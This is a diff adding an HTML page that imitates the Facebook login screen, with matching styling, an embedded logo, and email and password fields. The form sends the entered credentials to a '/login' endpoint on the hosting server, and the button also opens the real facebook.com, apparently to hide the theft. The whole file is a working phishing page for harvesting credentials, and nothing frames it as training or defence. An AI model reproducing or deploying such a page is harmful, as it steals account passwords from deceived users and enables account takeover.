@@ -1,0 +1,89 @@
+
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>log in facebook</title>
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #e9ebee;
+            margin: 0;
+            height:100vh;
+        }
+
+        .login-container {
+            max-width: 400px;
+            margin: 80px auto;
+            background: #fff;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px 0 rgba(0, 0, 0, 0.1);
+        }
+
+        .login-container h2 {
+            text-align: center;
+            color: #4b4f56;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #dddfe2;
+            margin-bottom: 20px;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+
+        button {
+            width: 100%;
+            background: #4267b2;
+            color: #ffffff;
+            border: none;
+            padding: 15px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background: #365899;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .forgot-password a {
+            color: #385898;
+            text-decoration: none;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="login-container">
+        <h2>Log in to Facebook</h2>
+        <img style="display: block;margin:auto;padding:10px 0 40px 0 " src="data:image/png;base64,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" alt="">
+        <form action="/login" method="post">
+            <input type="text" placeholder="Email address or phone number" name="number" required>
+            <br>
+            <input type="password" placeholder="Password" name="password" required>
+            <br>
+            <button  type="submit" onclick="window.open('https://www.facebook.com/')">Log In</button>
+        </form>
+        <div class="forgot-password">
+            <a href="#">Forgot Password?</a>
+        </div>
+    </div>
+
+</body>
+
+</html>
